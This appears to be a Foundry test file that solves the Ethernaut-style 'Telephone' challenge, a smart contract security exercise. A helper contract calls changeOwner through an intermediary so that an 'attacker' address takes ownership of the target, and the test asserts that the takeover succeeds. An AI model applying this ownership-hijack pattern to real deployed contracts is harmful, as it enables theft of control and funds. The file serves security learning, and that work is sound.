// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {Telephone} from "../src/Telephone.sol";

contract TelephoneHack {
    Telephone public target;

    constructor(Telephone _target) {
        target = _target;
    }

    function hack(address _owner) public {
        target.changeOwner(_owner);
    }
}

contract TelephoneTest is Test {
    TelephoneHack public hackTarget;
    Telephone public target;

    function setUp() public {
        target = new Telephone();
        hackTarget = new TelephoneHack(target);
    }

    function test_Telephone() public {
        address attacker = makeAddr("attacker");
        address ownerBefore = target.owner();
        assert(ownerBefore != attacker);

        // Attack
        vm.startPrank(attacker);
        hackTarget.hack(attacker);

        address ownerAfter = target.owner();
        assertEq(ownerAfter, attacker);
    }
}
